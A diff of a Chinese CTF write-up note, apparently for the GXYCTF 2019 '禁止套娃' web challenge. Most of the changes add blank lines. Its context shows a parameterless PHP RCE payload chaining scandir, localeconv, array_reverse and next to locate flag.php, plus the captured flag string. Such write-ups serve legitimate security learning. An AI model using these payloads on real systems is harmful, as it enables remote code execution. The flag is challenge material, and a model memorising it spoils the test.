@@ -2,7 +2,9 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20221114101945.png]]
+
 然后好像就没有然后了QAQ
 
 ---
@@ -157,6 +159,7 @@ array(5) {
 
 # 获取`'flag.php'`
 `'flag.php'`在数组的倒数第二个位置
+
 可以通过`array_reverse`函数将数组倒序返回，再利用`next`函数取第二个元素
 ```php
 /?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));
@@ -179,6 +182,7 @@ $flag = "flag{b0706baf-2c5c-4499-8a5e-8961814c3bf6}";
 
 ---
 这篇大佬写的wp还介绍了更多无参数RCE的骚操作
+
 https://johnfrod.top/ctf/gxyctf-2019禁止套娃/
 
 #Web #PHP #git泄露 #目录爆破 #数组 #函数 #RCE #无参数
